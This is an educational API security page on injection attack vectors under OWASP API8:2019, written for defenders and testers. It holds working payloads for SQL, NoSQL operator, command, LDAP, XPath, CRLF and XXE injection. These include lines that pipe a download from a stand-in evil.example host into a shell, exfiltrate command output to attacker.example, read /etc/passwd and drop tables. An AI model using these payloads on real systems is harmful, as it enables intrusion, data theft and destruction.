# API8:2019 Injection - Attack Vectors

## Table of Contents
- [Understanding Injection Attack Vectors](#understanding-injection-attack-vectors)
- [Core Attack Flow](#core-attack-flow)
- [SQL Injection](#sql-injection)
- [NoSQL / Operator Injection](#nosql--operator-injection)
- [OS Command Injection](#os-command-injection)
- [LDAP and XPath Injection](#ldap-and-xpath-injection)
- [ORM / Query-Builder Injection](#orm--query-builder-injection)
- [Sort / Filter / Field Injection](#sort--filter--field-injection)
- [Header and Log Injection](#header-and-log-injection)
- [GraphQL and XML Injection](#graphql-and-xml-injection)
- [Chaining Injection](#chaining-injection)

## Understanding Injection Attack Vectors

> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in systems you own or are authorised to test.

Injection is exploited by **probing the boundary between data and code**. The attacker sends input that *would break out of a value*—a quote, a shell metacharacter, a query operator, a CRLF—and watches how the API responds. A change in behaviour (an error, a different result set, a timing delay, an extra log line) confirms that the input reached an interpreter.

Because APIs speak JSON and XML, the attacker's toolkit is broader than the classic web form: they can flip a field from a string to an object, nest operators, and target any of the several interpreters a single endpoint touches.

### Core Attack Flow

```
1. Map inputs
   ↓
   Every param, path segment, JSON/XML field, and header is a candidate
2. Probe the boundary
   ↓
   Send ' " ; | $() {"$ne":null} \r\n and watch for errors / behaviour change
3. Confirm the interpreter
   ↓
   SQL error? NoSQL bypass? command output? extra log line? timing delay?
4. Exploit
   ↓
   UNION / boolean / time-based extraction, operator bypass, RCE, log forgery
5. Escalate / Exfiltrate
   ↓
   Dump data, write/delete, run commands, pivot with the DB/host privileges
```

## SQL Injection

### 1. Authentication Bypass

```
POST /api/login HTTP/1.1
Content-Type: application/json

{"username":"admin'--","password":"anything"}

-- Built as: SELECT * FROM users WHERE username='admin'--' AND password='...'
-- The -- comments out the password check; the admin row is returned.
```

### 2. UNION-Based Extraction

```
GET /api/products?category=books' UNION SELECT username,password,NULL FROM users-- HTTP/1.1

-- SELECT name,price,stock FROM products WHERE category='books'
--   UNION SELECT username,password,NULL FROM users--'
-- Credentials appear in the product-listing JSON.
```

### 3. Boolean / Blind Extraction

```
# The response body differs when the condition is true vs false:
GET /api/items?id=10 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'
# 200 with a row  -> first char is 'a'; iterate character by character.
```

### 4. Time-Based (fully blind)

```
# No visible output? Ask the DB to sleep when a condition holds:
GET /api/items?id=10; IF (1=1) WAITFOR DELAY '0:0:5'--   (SQL Server)
GET /api/items?id=10 AND SLEEP(5)                        (MySQL)
# A 5-second delay confirms the injection and leaks data one bit at a time.
```

**Payoff**: read/modify any data the DB account can reach—even with no error messages and no data echoed back.

## NoSQL / Operator Injection

### 1. Login Bypass with Operator Objects

```
POST /api/login HTTP/1.1
Content-Type: application/json

{"username":{"$gt":""},"password":{"$ne":null}}

// db.users.findOne({username:{$gt:""}, password:{$ne:null}})
// "any username greater than empty, any non-null password" -> returns a user.
```

### 2. Data Enumeration with $regex

```
// Extract a password one character at a time by testing prefixes:
{"username":"admin","password":{"$regex":"^a"}}   // 200 -> starts with 'a'
{"username":"admin","password":{"$regex":"^ab"}}  // iterate to recover it
```

### 3. Server-Side JavaScript via $where

```
// If $where is enabled, arbitrary JS runs in the query context:
{"$where":"this.password.length > 0"}            // logic injection
{"$where":"sleep(5000) || true"}                 // blind timing / DoS
```

### 4. Operator Injection Through Query Strings

```
# Some parsers turn bracketed query strings into nested objects:
GET /api/users?password[$ne]=  HTTP/1.1
# Parsed as { password: { $ne: '' } } -> same bypass without a JSON body.
```

**Payoff**: authentication bypass and record enumeration with no credential, plus optional RCE/DoS through `$where`. Watch for any field where a string is expected but an object arrives.

## OS Command Injection

### 1. Metacharacter Chaining

```
POST /api/ping HTTP/1.1
Content-Type: application/json

{"host":"127.0.0.1; id"}

# system("ping -c1 " + host) -> ping -c1 127.0.0.1; id
# The ; terminates ping and runs id.
```

### 2. Command Substitution

```
{"filename":"report$(whoami).pdf"}
{"filename":"report`whoami`.pdf"}

# $() and backticks execute and substitute their output inline.
```

### 3. Piping and Boolean Operators

```
{"host":"127.0.0.1 | cat /etc/passwd"}
{"host":"127.0.0.1 && curl http://evil.example/x | sh"}
{"host":"127.0.0.1 & sleep 5"}
# | && & each chain or background an attacker command.
```

### 4. Blind Command Injection (out-of-band)

```
# No output returned? Exfiltrate via DNS/HTTP callback:
{"host":"127.0.0.1; curl http://$(whoami).attacker.example"}
# The DNS lookup for the callback leaks the command output.
```

**Payoff**: remote code execution on the API host. Any feature that pings, converts, compresses, or exports by shelling out is a prime target.

## LDAP and XPath Injection

### LDAP Filter Injection

```
# Endpoint: GET /api/directory?user=alice
# Filter: (&(uid=alice)(objectClass=person))

# Attacker: user = *)(uid=*))(|(uid=*
(&(uid=*)(uid=*))(|(uid=*)(objectClass=person))
# Wildcards + injected clauses match every directory entry.

# Auth-bypass variant against a bind filter:
user = *)(&))    ->    (&(uid=*)(&))(...)   # always-true
```

### XPath Injection

```
# Query: /users/user[username/text()='alice' and password/text()='x']
# Attacker username: alice' or '1'='1
/users/user[username/text()='alice' or '1'='1' and password/text()='x']
# The or '1'='1' makes the predicate always true.
```

**Payoff**: authentication bypass and full enumeration of the directory or XML document by injecting filter/predicate metacharacters (`* ( ) & | '`).

## ORM / Query-Builder Injection

An ORM only protects you when values are **bound**. These escape hatches reintroduce classic SQL injection:

```
# Django - raw() with concatenation
User.objects.raw("SELECT * FROM users WHERE name = '" + name + "'")

# SQLAlchemy - text() with an f-string
session.execute(text(f"SELECT * FROM users WHERE name = '{name}'"))

# Node / Knex - raw template literal
knex.raw(`SELECT * FROM users WHERE id = ${id}`)

# Sequelize - literal() splices unescaped SQL
Model.findAll({ where: sequelize.literal("name = '" + name + "'") })

# Prisma - the *Unsafe variants concatenate:
prisma.$queryRawUnsafe("SELECT * FROM users WHERE name = '" + name + "'")
```

### ORDER BY / Column-Name Injection

```
# Column and direction can't be bound as parameters, so devs concatenate:
GET /api/users?sort=name; DROP TABLE users--
"SELECT * FROM users ORDER BY " + sort
# ORDER BY / column contexts are a classic injection blind spot.
```

**Payoff**: everything SQL injection offers, hidden behind a false sense of ORM safety. `ORDER BY`/column/table positions cannot be parameterised and must be allow-listed instead.

## Sort / Filter / Field Injection

APIs love client-driven querying—and each flexible parameter is a sink if mapped to raw query text.

```
# Field selection spliced into a projection:
GET /api/users?fields=id,email,(SELECT password FROM admins)

# Filter operator passed through to the datastore:
GET /api/orders?filter[total][$gt]=0    -> operator injection (NoSQL)

# Sort direction/column concatenated:
GET /api/users?sort=(CASE WHEN (1=1) THEN name ELSE price END)
```

**Payoff**: attacker-controlled columns, operators, and ordering leak data or change query logic. These parameters are frequently overlooked because they "aren't user data."

## Header and Log Injection

### Log Forgery via CRLF

```
# A header value written into a log without neutralising newlines:
X-Forwarded-For: 1.2.3.4\r\n2026-01-01 00:00:00 INFO admin login OK from 1.2.3.4

# The injected \r\n forges a second, fake log line.
```

### HTTP Response Splitting

```
# User input reflected into a response header:
GET /api/redirect?url=/next%0d%0aSet-Cookie:%20session=attacker

# %0d%0a (CRLF) injects an attacker-controlled Set-Cookie header.
```

**Payoff**: forged log entries that mislead responders or break log parsers/SIEM ingestion; response splitting that injects headers, poisons caches, or sets cookies. Neutralise CR/LF in anything user-controlled written to logs or headers.

## GraphQL and XML Injection

### GraphQL Argument Injection

```
query {
  users(filter: "role='user' OR 1=1") { email }
}
# If the resolver forwards `filter` raw into SQL, this is SQL injection
# reached through a GraphQL argument.
```

### XML External Entity (XXE) — an injection cousin

```
POST /api/import HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY secret SYSTEM "file:///etc/passwd">
]>
<data>&secret;</data>
# A parser with external entities enabled reads local files or reaches
# internal URLs (SSRF).
```

**Payoff**: GraphQL becomes a new channel to any downstream interpreter; XML parsers with entities enabled leak files and enable SSRF. Sanitise resolver arguments and disable external entities.

## Chaining Injection

Injection is often the first link in a longer chain:

```
SQL injection dumps password hashes  -> crack offline
        +
Reused admin credential              -> log into the admin API
        +
Command injection in an export tool  -> RCE on the host
        =  full compromise from one injectable parameter
```

Another common chain in a NoSQL stack:

```
Operator injection bypasses login    -> authenticated as any user
        -> $regex enumerates other users' tokens
        -> $where timing leaks remaining secrets
        -> over-privileged DB account allows writes / deletes
```

## Key Takeaways

1. **Injection is found by probing the data/code boundary**—a quote, a metacharacter, an operator object, a CRLF.
2. **Blind is still exploitable**—boolean and time-based techniques extract data with no visible output.
3. **JSON/XML let attackers inject objects, not just strings**—NoSQL operator injection is unique to structured APIs.
4. **Every parameter counts**—`sort`, `filter`, `fields`, headers, and GraphQL arguments are frequent, overlooked sinks.
5. **One injectable parameter chains to full compromise**—data theft, RCE, and lateral movement.

## Next Steps

- **[Prevention Guide](prevention.md)**: Parameterise, type, allow-list, and least-privilege
- **[Code Examples](examples.md)**: Vulnerable vs. secure across frameworks
- **[API Security Top 10](/learn/api)**: Back to the full learning path
- **[Practice](/practice)**: Test your skills against injectable endpoints
